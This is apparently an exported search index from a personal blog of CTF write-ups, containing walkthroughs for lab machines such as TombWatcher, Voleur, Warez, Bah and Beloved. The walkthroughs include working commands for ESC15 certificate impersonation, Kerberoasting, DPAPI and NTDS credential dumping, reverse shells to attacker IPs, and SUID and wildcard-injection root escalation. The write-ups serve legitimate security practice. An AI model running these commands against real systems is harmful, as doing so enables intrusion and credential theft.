00:47:48+00:00\rCertificate Validity End : 2123-11-16 00:57:48+00:00\rWeb Enrollment\rHTTP\rEnabled : False\rHTTPS\rEnabled : False\rUser Specified SAN : Disabled\rRequest Disposition : Issue\rEnforce Encryption for Requests : Enabled\rActive Policy : CertificateAuthority_MicrosoftDefault.Policy\rPermissions\rOwner : TOMBWATCHER.HTB\\Administrators\rAccess Rights\rManageCa : TOMBWATCHER.HTB\\Administrators\rTOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rManageCertificates : TOMBWATCHER.HTB\\Administrators\rTOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rEnroll : TOMBWATCHER.HTB\\Authenticated Users\rCertificate Templates\r0\rTemplate Name : WebServer\rDisplay Name : Web Server\rCertificate Authorities : tombwatcher-CA-1\rEnabled : True\rClient Authentication : False\rEnrollment Agent : False\rAny Purpose : False\rEnrollee Supplies Subject : True\rCertificate Name Flag : EnrolleeSuppliesSubject\rExtended Key Usage : Server Authentication\rRequires Manager Approval : False\rRequires Key Archival : False\rAuthorized Signatures Required : 0\rSchema Version : 1\rValidity Period : 2 years\rRenewal Period : 6 weeks\rMinimum RSA Key Length : 2048\rTemplate Created : 2024-11-16T00:57:49+00:00\rTemplate Last Modified : 2024-11-16T17:07:26+00:00\rPermissions\rEnrollment Permissions\rEnrollment Rights : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rTOMBWATCHER.HTB\\cert_admin\rObject Control Permissions\rOwner : TOMBWATCHER.HTB\\Enterprise Admins\rFull Control Principals : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rWrite Owner Principals : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rWrite Dacl Principals : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rWrite Property Enroll : TOMBWATCHER.HTB\\Domain Admins\rTOMBWATCHER.HTB\\Enterprise Admins\rTOMBWATCHER.HTB\\cert_admin\r[+] User Enrollable Principals : TOMBWATCHER.HTB\\cert_admin\r[!] Vulnerabilities\rESC15 : Enrollee supplies subject and schema version is 1.\r[*] Remarks\rESC15 : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly. We use office2john to extract the password hash and save it to a file.\noffice2john Access_Review.xlsx \u0026gt; hash Then we use John The Ripper to crack the password.\njohn -w=/usr/share/wordlists/rockyou.txt hash Once we know the password, we can access the Excel file.\nWe obtain the credentials for the users svc_ldap and svc_iis.\nsvc_ldap : M1XyC9pW7qT5Vn\rsvc_iss : N5pXyW1VqM7CZ8 At this point, there’s nothing more interesting to explore.\nWe now choose svc_ldap instead of ryan.naylor for domain mapping with BloodHound, as this user has more extensive read permissions that allow collecting all relationships, ACLs, and possible escalation paths, whereas a normal user like ryan.naylor would have limited access.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; bloodhound-python -d \u0026#39;voleur.htb\u0026#39; -u \u0026#39;svc_ldap\u0026#39; -p \u0026#39;M1XyC9pW7qT5Vn\u0026#39; -gc \u0026#39;dc.voleur.htb\u0026#39; -ns 10.10.11.76 -v --zip -c all We upload the resulting ZIP file to BloodHound and, analyzing the user svc_ldap, we see that they have WriteSPN permissions over the user svc_winrm and belong to the RESTORE_USERS group, which has GenericWrite permissions over lacey.miller. With these permissions, it is possible to perform a Kerberoasting Attack to extract the password hashes of these users.\nWe create another TGT, this time for the user svc_ldap.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-getTGT voleur.htb/\u0026#39;svc_ldap\u0026#39;:\u0026#39;M1XyC9pW7qT5Vn\u0026#39;\rexport KRB5CCNAME=$PWD/svc_ldap.ccache Then we clone the targetedKerberoast repository and run it. It uses the svc_ldap TGT to request service tickets (SPNs) for which it has permissions. These tickets are encrypted as hashes, which we can then attempt to crack.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git faketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; python3 targetedKerberoast.py -v -d \u0026#39;voleur.htb\u0026#39; -u \u0026#39;svc_ldap\u0026#39; --dc-host dc.voleur.htb -k Finally, we use John the Ripper to crack the hashes.\njohn -w=/usr/share/wordlists/rockyou.txt hashes We obtain a single password, and after testing which account it belongs to, we realize it is for svc_winrm.\nChecking the Excel file, we see that this user has Remote Management permissions, so we can access the machine remotely using Evil-WinRM. To do this, we generate a new TGT, this time for the svc_winrm user.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-getTGT voleur.htb/\u0026#39;svc_winrm\u0026#39;:\u0026#39;{SVC_WINRM-PASSWORD}\u0026#39;\rexport KRB5CCNAME=$PWD/svc_winrm.ccache In this case, we edit /etc/krb5.conf because Evil-WinRM cannot resolve the KDC by domain name, and using the IP directly allows the connection to work correctly.\n[libdefaults]\rdefault_realm = VOLEUR.HTB\r[realms]\rVOLEUR.HTB = {\rkdc = 10.10.11.76\radmin_server = 10.10.11.76\r}\r[domain_realm]\r.voleur.htb = VOLEUR.HTB\rvoleur.htb = VOLEUR.HTB faketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; evil-winrm -i dc.voleur.htb -r voleur.htb We obtain the User Flag, located in the Desktop directory.\nAs seen earlier, the user svc_ldap belongs to the RESTORE_USERS group, so if we access it, we can restore the user todd.wolfe, identified in the Excel file, whose password was provided: NightT1meP1dg3on14.\nThe first step is to upload RunasCS, an executable that allows us to run commands as another user.\nwget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip\runzip RunasCs.zip We upload it to the target machine via Evil-WinRM using the svc_winrm account.\nupload RunasCs.exe Next, we execute a Reverse Shell to access the machine as svc_ldap.\n.\\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.79:4444 Once inside, we search for the deleted user.\nGet-ADObject -Filter \u0026#39;isDeleted -eq $true\u0026#39; -IncludeDeletedObjects We restore it using its ObjectID.\nRestore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db With the todd.wolfe account restored, we can now access its shared resources. Before doing so, we create a TGT for this user so we can authenticate correctly and use their permissions.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-getTGT voleur.htb/\u0026#39;todd.wolfe\u0026#39;:\u0026#39;NightT1meP1dg3on14\u0026#39;\rexport KRB5CCNAME=$PWD/todd.wolfe.ccache faketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/todd.wolfe@dc.voleur.htb Accessing the system as todd.wolfe, we can explore their AppData/Roaming/Microsoft directory, which contains critical folders like Credentials, Crypto, and Vault. These folders store sensitive information protected by DPAPI (Data Protection API), used by Windows to encrypt passwords, keys, and user certificates.\nSince we are already authenticated as the user, we can extract these files and decrypt them locally without attacking other account hashes. This exploits the known DPAPI Weakness / Credential Store Exposure, allowing us to retrieve the current user’s encrypted secrets.\nSensitive file extraction:\nMaster Key: contains the key to decrypt all of the user’s secrets. get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88 Credentials: stores an encrypted password that can be recovered using the Master Key. get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3 After downloading the sensitive files, we use impacket-dpapi to decrypt them. First, using the Master Key file, the user’s SID, and their password, we obtain the Master Key hash, representing the key protecting all user secrets. This hash is then used to decrypt any file protected by DPAPI.\nimpacket-dpapi masterkey \\\r-file 08949382-134f-4c63-b93c-ce52efc0aa88 \\\r-sid S-1-5-21-3927696377-1337352550-2781715495-1110 \\\r-password NightT1meP1dg3on14 With this hash, we can decrypt files inside Credentials, which may contain passwords or other encrypted secrets stored by the user.\nimpacket-dpapi credential \\\r-file 772275FAD58525253490A9B0039791D3 \\\r-key 0xd2832547d1d5e0a01... It contains the password for the user jeremy.combs.\nThe user jeremy.combs belongs to the THIRD-LINE TECHNICIANS group, allowing us to access the group’s shared resources and review stored information, after first creating the TGT for this user.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/jeremy.combs@dc.voleur.htb Within the shared resources, we find two items of interest: a note and an id_rsa file, corresponding to an SSH private key.\nThe content of the note is:\nTo identify which user owns the private key, we generate the public key from it using:\nsudo ssh-keygen -y -f id_rsa The user’s name often appears at the end of the public key, allowing us to confirm the owner.\nIn the Nmap scan performed at the start, we had already identified that the SSH service is exposed on port 2222.\nBefore using the downloaded private key, we set the proper permissions.\nchmod 600 id_rsa With the key ready, we connect to the SSH server on port 2222 using the user svc_backup.\nssh -i id_rsa -p 2222 svc_backup@voleur.htb Connecting via SSH, we see we are in a Linux environment. Inspecting the /mnt mount point, we find the Windows C: volume accessible, meaning we can access the Windows filesystem from the Linux host. Inside /mnt/c/IT/Third-Line Support, we find a new folder called Backups and within it the Active Directory folder, which contains ntds.dit and ntds.jfm.\nntds.dit is the main Active Directory database, storing user accounts, groups, policies, and password hashes.\nntds.jfm is a log file that keeps the database consistent when changes are made or recovered.\nNext, we download them to our local machine so we can use them.\nscp -i id_rsa -P 2222 \u0026#34;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/*\u0026#34; . In addition to the AD database, we also need the SYSTEM file, which contains keys required to decrypt the hashes stored in ntds.dit. It is located at /mnt/c/IT/Third-Line Support/Backups/registry.\nscp -i id_rsa -P 2222 \u0026#34;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Registry/SYSTEM\u0026#34; . With these three files locally, we use impacket-secretsdump to extract Active Directory account hashes.\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL Among the results, we obtain the NTLM hash of the Administrator account password, which we use to request a TGT for this user. With this TGT, we can authenticate as Administrator and access their privileges.\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-getTGT -hashes :\u0026lt;ADMINISTRATOR_NTLM_HASH\u0026gt; voleur.htb/\u0026#39;Administrator\u0026#39;\rexport KRB5CCNAME=$PWD/Administrator.ccache faketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; evil-winrm -i dc.voleur.htb -r voleur.htb Finally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/voleur/","summary":"Difficulty: Medium 🟠","title":"Voleur - Hack The Box"},{"content":"\rMachine Link\nWhen the machine starts, it displays its IP address; in this case, it is 192.168.18.190.\nThe victim machine's IP address\rTo begin, we will perform a scan using the NMAP tool, which will help us identify open ports on the target machine. First, we will use the following command for a quick scan that informs us about the open ports. We will scan all ports (65535) without depth.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.190 And now, with the open ports identified, we will perform a more detailed scan:\nnmap -sCV -p22,80,6800 -n -Pn 192.168.18.190 -oN target We observe that port 6800 is running Aria2, which is an open-source downloader that supports various protocols such as HTTP, FTP, BitTorrent.\nBy accessing port 80, we obtain the username Carolina.\nUser carolina\rNext, we notice that by selecting \u0026lsquo;By URLs\u0026rsquo; within \u0026lsquo;Add\u0026rsquo;, we can upload files to any directory. So, I am going to copy my id_rsa.pub to a file named authorized_keys and upload it, allowing the victim machine to recognize our machine as authorized, specifically as the user Carolina.\ncp id_rsa.pub authorized_keys If you don\u0026rsquo;t have the id_rsa.pub file, you can create it with the following command:\nssh-keygen And with Python, we start a web server on port 8080:\npython3 -m http.server 8080 Now, we put the URL where our file is located and change the destination directory to /home/carolina/.ssh.\nWe send it, and now we can access via port 22 (SSH) as the user carolina.\nWe are now Carolina\rLet\u0026rsquo;s check how many users are on the machine. It appears that there are only two users: carolina and root.\ngrep /bin/bash /etc/passwd User on the machine\rWe get the user flag, and now it’s time to move on to privilege escalation.\nPrivilege escalation to Root We enumerate the SUID binaries on the machine, and there is one that we can use to escalate to root very easily. The relevant binary is rtorrent.\nWe search in GTFObins, and it provides a way to escalate to root using this SUID binary by running the following command:\nCommand for privilege escalation\recho \u0026#34;execute = /bin/sh,-p,-c,\\\u0026#34;/bin/sh -p \u0026lt;$(tty) \u0026gt;$(tty) 2\u0026gt;$(tty)\\\u0026#34;\u0026#34; \u0026gt;~/.rtorrent.rc /usr/bin/rtorrent We are root\rNow that we have root access, let’s grab the root flag and complete the machine\n","permalink":"http://localhost:1313/writeups/easy/warez/","summary":"Difficulty: Easy 🟢","title":"Warez - HackMyVM"},{"content":"\rGitHub Repository\nIn this section, you will find the CTF machines I have personally created. Currently, there is only one machine available called SilentDev, with plans to add more at different difficulty levels.\nEach machine offers challenges designed to practice exploitation and analysis techniques, from basic to more advanced skills.\nMedium Difficulty Machines 🟠 SilentDev SilentDev requires some basic exploitation and analysis skills, as well as more advanced techniques in certain parts. It\u0026rsquo;s an excellent challenge for intermediate players wanting to broaden their CTF experience.\nLink to download: SilentDev\n","permalink":"http://localhost:1313/projects/ctfmachines/","summary":"CTF Machines created by me","title":"CTF Machines"},{"content":"GitHub Repository\nWelcome to my personal collection of CTF (Capture The Flag) challenges. Designed to help you practice, learn, and have fun in the world of cybersecurity and ethical hacking.\nChallenges will be updated periodically so there’s always something new to explore.\n⚠️ Disclaimer:\nThese challenges are for educational purposes only. I am not responsible for the misuse of these skills for illegal or unethical activities. Always practice in authorized environments.\n📂 Challenge Categories 🖼️ Steganography 🔑 Cryptography 🔒 Exploitation 🌐 Networking 🌀 Obfuscation 🤝 Collaborate! Have a challenge you’d like to share?\nSubmit your challenge — Send me your idea or files. Get in touch — DM me on Twitter: @CyberConper Be featured — Your challenge will be added here with full credit. 🖼️ Steganography 👨‍💻 CTF 🌐 Link Challenge 01 Download Challenge 05 Download Challenge 08 Download 🔑 Cryptography 👨‍💻 CTF 🌐 Link Challenge 02 Download Challenge 04 Download 🔒 Exploitation 👨‍💻 CTF 🌐 Link Challenge 03 Download 🌐 Networking 👨‍💻 CTF 🌐 Link Challenge 06 Download 🌀 Obfuscation 👨‍💻 CTF 🌐 Link Challenge 07 Download ","permalink":"http://localhost:1313/projects/ctfchallenges/","summary":"\u003cp\u003e\u003ca href=\"https://github.com/Conper/CTF-Challenges\"\u003eGitHub Repository\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eWelcome to my personal collection of \u003cstrong\u003eCTF (Capture The Flag)\u003c/strong\u003e challenges.\nDesigned to help you practice, learn, and have fun in the world of cybersecurity and ethical hacking.\u003cbr\u003e\nChallenges will be updated periodically so there’s always something new to explore.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e⚠️ Disclaimer:\u003c/strong\u003e\u003cbr\u003e\nThese challenges are for \u003cstrong\u003eeducational purposes only\u003c/strong\u003e. I am not responsible for the misuse of these skills for illegal or unethical activities. Always practice in authorized environments.\u003c/p\u003e","title":"🏴‍☠️ CTF Challenges"},{"content":"GitHub Repository\nDescription Opened-Ports is a Linux script that uses Nmap to scan a target and extract only the most relevant information:\nOpen ports Services running on those ports Service versions Detected operating system It can:\nAnalyze a previously saved Nmap scan result file. Perform a new scan from scratch and then analyze the results. 📝 Note: Designed for Linux. Functionality on other operating systems is not guaranteed.\nInstallation (Linux) Download the script: wget https://raw.githubusercontent.com/Conper/Opened-Ports/main/oports.sh mv ./oports.sh /usr/bin/oports chmod +x /usr/bin/oports ","permalink":"http://localhost:1313/projects/oports/","summary":"TicTacToe game created in Android Studio with Kotlin","title":"Opened Ports"},{"content":"GitHub Repository\nThis section showcases a TicTacToe game I created in Android Studio with Kotlin.\nIt was a good practice project to learn the basics of mobile development and Kotlin at the time.\nPreview:\n","permalink":"http://localhost:1313/projects/tictactoeapp/","summary":"TicTacToe game created in Android Studio with Kotlin","title":"TicTacToe App"},{"content":"\rI am currently studying Systems and Network Administration, with a strong focus on offensive security and penetration testing. I enjoy discovering vulnerabilities, exploiting them in controlled environments, and learning from the process to strengthen overall security.\nI improve my skills by solving CTF challenges on platforms like Hack The Box and HackMyVM.\n📧 You can contact me here: contact@conper.xyz\n","permalink":"http://localhost:1313/about/","summary":"\u003cdiv style=\"display: flex; justify-content: center;\"\u003e\r\n  \u003cimg src=\"/images/avatar.jpg\" alt=\"Mi foto\" width=\"200\" style=\"border-radius: 50%; box-shadow: 0 0 10px rgba(0,0,0,0.3); margin-bottom: 50px;\"/\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eI am currently studying \u003cstrong\u003eSystems and Network Administration\u003c/strong\u003e, with a strong focus on \u003cstrong\u003eoffensive security\u003c/strong\u003e and \u003cstrong\u003epenetration testing\u003c/strong\u003e.\nI enjoy discovering vulnerabilities, exploiting them in controlled environments, and learning from the process to strengthen overall security.\u003c/p\u003e\n\u003cp\u003eI improve my skills by solving \u003cstrong\u003eCTF challenges\u003c/strong\u003e on platforms like \u003ca href=\"https://app.hackthebox.com/profile/1296157\"\u003e\u003cstrong\u003eHack The Box\u003c/strong\u003e\u003c/a\u003e and \u003ca href=\"https://hackmyvm.eu/profile/?user=Conper\"\u003e\u003cstrong\u003eHackMyVM\u003c/strong\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003e📧 You can contact me here: \u003ca href=\"mailto:contact@conper.xyz\"\u003e\u003cstrong\u003econtact@conper.xyz\u003c/strong\u003e\u003c/a\u003e\u003c/p\u003e","title":"About me"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/easy/atom/","summary":"Difficulty: Easy 🟢","title":"Atom - HackMyVM"},{"content":"\rMachine Link\nWhen starting the machine, it displays its IP address.\nIP of the victim machine\rLet\u0026rsquo;s begin with a quick NMAP scan to identify the open ports on the target machine.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.184 Now that we have identified the open ports, we will perform a more detailed scan to determine the services running on each port along with their respective versions and other relevant details.\nnmap -sCV -p80,3306 -n -Pn 192.168.18.184 -oN target Visiting the site hosted on port 80 (HTTP) brings us to a login page.\nLogin screen\rI have found that the qdPM version is vulnerable and the password is exposed.\nI search for vulnerabilities in qdPM on searchsploit\rThe username and password can be found in this directory:\nPath where the username and password are located\rWe obtain the file\rWe read the file and find that it is a YAML configuration for a database, containing the username and password needed to access it. YAML files like this are commonly used to store configuration data in a simple, readable format with key-value pairs and indentation.\nNow we log in, but not on the website since we don\u0026rsquo;t have an email, but through port 3306 (MySQL) to access the database hosting the victim machine.\nWe are inside the database\rI select the \u0026lsquo;hidden\u0026rsquo; database:\nWe find 2 tables: \u0026lsquo;url\u0026rsquo; and \u0026lsquo;users\u0026rsquo;:\nOn one hand, in the \u0026lsquo;users\u0026rsquo; table, we find IDs, usernames, and passwords.\nOn the other hand, in the \u0026lsquo;url\u0026rsquo; table, we obtain a list of URLs.\nWe will save all the information obtained in a file.\nTo start, we will use WFUZZ to find which URLs can serve as subdomain names.\nwfuzz -c -w URLs.txt -u 192.168.18.184 -H \u0026#34;HOST: FUZZ\u0026#34; We notice that \u0026lsquo;party.bah.hmv\u0026rsquo; is different from the rest. So, we add it to the /etc/hosts file to make our machine recognize that subdomain with the corresponding IP.\nsudo nano /etc/hosts And now we access.\nIt prompts us to log in. I decide to use the username and password we obtained earlier.\nUser: qpmadmin\rPassword: qpmpazzw And we are in. Now, I am going to set up a reverse shell for a better interface, and also configure the TTY for improved control.\nLet\u0026rsquo;s enumerate the users on the victim machine:\ngrep /bin/bash /etc/passwd Users in the machine\rPrivilege escalation to rocio We see a user named rocio, which is present in the table we downloaded earlier from the database.\nRocio password\rWe switch to the rocio user and obtain the user flag.\nPrivilege escalation to root To do this, we will use pspy, which is a monitoring tool for Linux systems that helps detect important activities and processes discreetly.\nThen, using netcat, we will transfer the program from our local machine to the victim machine.\nVictim machine:\nnc -lvnp 8888 \u0026gt; pspy64 Local machine:\nnc 192.168.18.184 8888 \u0026lt; pspy64 And we grant permissions to pspy64.\nWe run pspy64 and observe the following.\nIt is a command line that executes shellinaboxd, a server that provides a browser-based web terminal. This service allows command line access through a web browser using the HTTP protocol. We observe that the root is running what is in /tmp/dev when someone accesses the /devel directory. Here in the shellinaboxd manual, we can see how it works:\nManual for shellinaboxd\rSo, I am going to create a file named dev in the /tmp directory where it sends a Reverse Shell, allowing quick access to the root user.\nContents of the 'dev' file\rAnd we grant permissions:\nchmod +x dev First, we set up a listener on port 4444 to catch any incoming connections, then we access the /devel directory.\nAnd we receive the Reverse Shell without any issues.\nWe are root\rWe obtain the root flag, and there you go, we have successfully completed hacking the machine.\n","permalink":"http://localhost:1313/writeups/easy/bah/","summary":"Difficulty: Easy 🟢","title":"Bah - HackMyVM"},{"content":"\rMachine Link\nWe find the victim machine’s IP address using the arp-scan tool, looking for a MAC address starting with 08:, which is typical for virtual machines.\nNext, we run an NMAP scan to identify open ports.\nAs a result, we observed that ports 22 (SSH) and 80 (HTTP) are open. Inside the web, we can see the following.\nIf we click on any link, we notice that it doesn\u0026rsquo;t load because it\u0026rsquo;s a domain that our local machine is not aware of.\nOur machine is not aware of that domain\rSo, we are going to edit the /etc/hosts file and add this domain with its corresponding IP:\nsudo nano /etc/hosts Now, upon entering the victim machine\u0026rsquo;s IP address again in Firefox, we see a website with an improved appearance.\nClicking on \u0026ldquo;Hello world!\u0026rdquo; we encounter a user and a comment.\nUser\rComment\rAs we have seen earlier, the website is built with WordPress. So, let\u0026rsquo;s use the wpscan tool to gather more information. Using this tool, we can confirm the existence of the user \u0026lsquo;smart_ass\u0026rsquo;.\nEnumerating users:\nwpscan --url http://beloved/ -e u Result of user enumeration\rNow, with the following command, we will enumerate the WordPress plugins used by this website:\nwpscan --url http://beloved/ --plugins-detection aggressive -t 50 --api-token=\u0026#39;YOUR_API\u0026#39; 📝 NOTE: To get the API key, you must register at wpscan.com\nAs a result, we can observe a plugin called wpDiscuz with an old version that is vulnerable.\nI go to Metasploit and find that it has an exploit that we can use for RCE (Remote Code Execution).\nExploit\rSetting up the options\rAnd we execute it with the run or exploit command, and now we would be inside:\nWe use the \u0026lsquo;shell\u0026rsquo; command to spawn a shell and then configure the TTY.\nPrivilege escalation to beloved When navigating to the /var/www directory, we can access the .bash_history file and review some executed commands.\nLater, after running sudo -l, we see that we are allowed to execute the nokogiri binary as the user beloved.\nSo, I decide to copy and execute the command I saw in the bash_history, and an Interactive Ruby (IRB) session opens.\nIn an Interactive Ruby session\rSo, we can execute commands with the following structure:\nsystem \u0026#39;COMMAND\u0026#39; So, I run a command to spawn a shell as beloved, and just like that, we become the beloved user.\nsystem \u0026#39;/bin/bash\u0026#39; And we can obtain the user flag.\nPrivilege escalation to root For the next privilege escalation, we will use pspy, which is a program that monitors the processes occurring on the machine.\nNow, let\u0026rsquo;s transfer pspy64 from our local machine to the victim machine by creating a web server with Python on port 8080.\nWe grant permissions with \u0026lsquo;chmod +x pspy64\u0026rsquo; and run it with \u0026lsquo;./pspy64\u0026rsquo;.\nchmod +x pspy64 ./pspy64 We notice that a command is executed every minute.\nThe chown command changes the owner and group of files or directories. In this case, it is applied to everything inside the /opt directory. Inside /opt, we found the root user\u0026rsquo;s id_rsa file (a private SSH key) and since we have write permissions in this directory, it could be exploited.\nNow, we will exploit chown to change the owner of the root\u0026rsquo;s id_rsa to beloved. (Link where it explains how to exploit this vulnerability: Wildcard Injection)\nWe can do it by executing the following commands in /opt:\ntouch reference touch -- --reference=reference After waiting a minute, we will see that the id_rsa file becomes owned by us. In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues. But since we already have the root\u0026rsquo;s id_rsa, we don\u0026rsquo;t need anything else.\nThe root's id_rsa is now under our ownership\rWe copy the contents of the id_rsa file and save it to our local machine. Next, we escalate privileges by running:\nchmod 600 id_rsa And we log in via SSH using the root user and this id_rsa, like this:\nssh -i id_rsa root@IP Finally, we obtain the root flag.\n","permalink":"http://localhost:1313/writeups/easy/beloved/","summary":"Difficulty: Easy 🟢","title":"Beloved - HackMyVM"},{"content":"\rMachine Link\n⚙️ Characteristics Characteristic Value Language C / C++ Arch x86-64 Platform Unix / Linux 🗒️ Writeup When trying to run the binary in different ways, it only returns the message \u0026ldquo;Bingus exploded\u0026rdquo;.\nWhat we\u0026rsquo;ll do is open the binary in Ghidra to inspect the code and find the function that checks the input.\nWe find the function that decides whether it has been exploited or not. We’ll analyze the function to understand the program’s logic and figure out how to make it print \u0026ldquo;Bingus survived\u0026rdquo;.\nBefore we start, we need to make it clear that param_1 is the number of arguments and param_2 is the list of program arguments.\nFirst condition: The conditional is triggered if any of these conditions are true:\nThere isn’t exactly one argument besides the program name.\nThe two characters of the argument are not the same.\nThe argument does not have exactly 2 characters.\nIn any of these cases, it prints \u0026ldquo;Bingus exploded\u0026rdquo;.\nTherefore, the hint to move forward is:\nPass exactly 1 argument.\nThe argument must be 2 identical characters.\n📝 NOTE: param_2 + 8 points to argv[1], the first argument of the program, because in memory each pointer takes up 8 bytes in 64-bit systems.\nLoop: For this part, I’ll rename the variables to make it simpler and easier to read.\nWhat this loop does is add each character of the string \u0026ldquo;This is a red herring\u0026rdquo; to num, summing their ASCII values since in C a character is treated as an integer in arithmetic operations.\nTo see the result after the loop finishes, we recreate the code:\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\rint main() {\rint num = 0x66; /* num = 102 */\rint i;\rsize_t x;\rconst char *str = \u0026#34;This is a red herring\u0026#34;;\rx = strlen(str); /* x = 21 */\rfor (i = 0; i \u0026lt; x; i++) {\rnum = num + str[i];\r}\rprintf(\u0026#34;%d\u0026#34;, num);\rreturn 0;\r} And we get num = 2021.\nFinal condition: This last condition adds num and the ASCII values of the first two characters of the parameter string. If the total is 2245 (0x8c5), it prints \u0026ldquo;Bingus survived\u0026rdquo;.\n$$\r\\begin{align*}\r2021 